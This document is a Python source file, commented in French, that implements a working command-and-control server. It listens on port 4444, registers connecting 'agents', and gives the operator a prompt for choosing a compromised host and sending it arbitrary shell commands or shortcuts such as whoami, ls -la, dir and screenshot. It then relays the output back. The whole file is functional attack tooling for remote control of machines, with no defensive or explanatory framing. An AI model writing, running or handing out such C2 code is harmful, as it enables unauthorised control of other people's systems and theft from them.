import socket
import threading
import queue
import time

class C2Server:
    def __init__(self, host='10.102.252.51', port=4444):
        self.host = host
        self.port = port
        self.agents = {}         # {agent_id: socket}
        self.queues = {}         # {agent_id: Queue} pour stocker les messages reçus
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Mapping des raccourcis -> commande envoyée au client
        # Remarque: certaines commandes peuvent être OS-dépendantes côté client.
        self.shortcuts = {
            "whoami": "whoami",
            # listfiles par défaut envoie ls -la (Unix). Si client Windows, utilise 'dir' via option 'win'
            "listfiles": "ls -la",
            "pwd": "pwd",
            # screenshot : nécessite que le client implémente une action 'screenshot'.
            # Ici on envoie 'screenshot' tel quel ; si le client ne le gère pas, il renverra une erreur.
            "screenshot": "screenshot"
        }

    def start(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[+] Serveur C2 en écoute sur {self.host}:{self.port}")

        # Thread pour le prompt principal
        threading.Thread(target=self.prompt, daemon=True).start()

        while True:
            client_socket, addr = self.server_socket.accept()
            agent_id = f"{addr[0]}:{addr[1]}"
            self.agents[agent_id] = client_socket
            self.queues[agent_id] = queue.Queue()
            print(f"[+] Nouvel agent connecté : {agent_id}")

            # Thread pour gérer le client
            threading.Thread(target=self.handle_client, args=(client_socket, agent_id), daemon=True).start()

    def handle_client(self, client_socket, agent_id):
        """
        Reçoit les messages de l'agent et les stocke dans la queue correspondante.
        """
        try:
            while True:
                data = client_socket.recv(4096).decode(errors="ignore")
                if not data:
                    break
                # Stocke le message pour le prompt et affiche aussi dans la console globale
                self.queues[agent_id].put(data)
                print(f"[{agent_id}] {data.strip()}")
        except Exception as e:
            print(f"[!] Erreur avec {agent_id}: {e}")
        finally:
            print(f"[-] Agent déconnecté : {agent_id}")
            client_socket.close()
            if agent_id in self.agents:
                del self.agents[agent_id]
            if agent_id in self.queues:
                del self.queues[agent_id]

    def prompt(self):
        """
        Prompt principal côté serveur.
        """
        while True:
            try:
                cmd = input("C2> ").strip()
            except (EOFError, KeyboardInterrupt):
                cmd = "exit"

            if cmd == "list":
                print("Agents connectés :")
                for agent_id in self.agents:
                    print(f" - {agent_id}")

            elif cmd.startswith("use "):
                # Syntaxe : use <agent_id>
                _, agent_id = cmd.split(maxsplit=1)
                if agent_id in self.agents:
                    print(f"[+] Vous contrôlez maintenant {agent_id}. Tapez 'exit' pour revenir au menu principal.")
                    self.agent_prompt(agent_id)
                else:
                    print("[!] Agent introuvable")

            elif cmd == "help":
                print("Commandes du prompt principal :")
                print("  list                      -> liste les agents connectés")
                print("  use <agent_id>            -> passe en sous-prompt pour contrôler un agent")
                print("  exit                      -> ferme le serveur proprement")
                print("\nRaccourcis disponibles (utilisables dans le sous-prompt d'agent) :")
                for k in self.shortcuts:
                    print(f"  {k}")
                print("Exemples dans l'agent prompt :")
                print("  whoami")
                print("  listfiles        (par défaut envoie 'ls -la' ; pour Windows: 'listfiles win')")
                print("  listfiles win    (envoie 'dir' au lieu de 'ls -la')")
                print("  pwd")
                print("  screenshot       (nécessite support côté client)")
                print("  exit             -> revient au prompt principal")

            elif cmd == "exit":
                print("[!] Fermeture du serveur...")
                for s in list(self.agents.values()):
                    try:
                        s.close()
                    except:
                        pass
                try:
                    self.server_socket.close()
                except:
                    pass
                break

            else:
                print("Commandes disponibles : list, use <agent_id>, help, exit")

    def agent_prompt(self, agent_id):
        """
        Sous-prompt pour un agent sélectionné.
        On traduit les raccourcis en commandes shell envoyées au client.
        """
        sock = self.agents.get(agent_id)
        q = self.queues.get(agent_id)

        if not sock or not q:
            print("[!] Socket ou queue manquante pour cet agent.")
            return

        while True:
            try:
                cmd = input(f"{agent_id}> ").strip()
            except (EOFError, KeyboardInterrupt):
                cmd = "exit"

            if cmd.lower() == "exit":
                break
            if not cmd:
                continue

            # Gestion des variantes, ex: "listfiles win"
            parts = cmd.split()
            base = parts[0].lower()

            # Déterminer commande réelle à envoyer
            if base in self.shortcuts:
                if base == "listfiles" and len(parts) > 1 and parts[1].lower().startswith("win"):
                    cmd_to_send = "dir"
                else:
                    cmd_to_send = self.shortcuts[base]
            else:
                # envoie tel quel ce que tape l'opérateur
                cmd_to_send = cmd

            # Ajoute un saut de ligne pour que le client puisse bien séparer les commandes (utile si client fait .strip())
            payload = cmd_to_send + "\n"
            try:
                sock.sendall(payload.encode())
            except Exception as e:
                print(f"[!] Erreur en envoyant la commande : {e}")
                break

            # On attend un court laps de temps pour récupérer la/les réponses
            # - Premier get bloque jusqu'à timeout pour donner le client le temps de répondre
            # - Ensuite on vide la queue sans bloquer
            collected = False
            try:
                # attend jusqu'à 2s pour une première réponse
                response = q.get(timeout=2.0)
                print(response.strip())
                collected = True
            except queue.Empty:
                # aucune réponse immédiate
                pass

            # vide tout ce qui reste dans la queue
            while True:
                try:
                    response = q.get_nowait()
                    print(response.strip())
                    collected = True
                except queue.Empty:
                    break

            if not collected:
                # Si aucune sortie n'est arrivée, on affiche une info (utile si le client exécute longuement ou ne renvoie rien)
                print("[!] Aucun retour reçu immédiatement. La commande peut être en cours d'exécution ou le client ne renvoie pas de sortie.")

if __name__ == "__main__":
    server = C2Server()
    server.start()

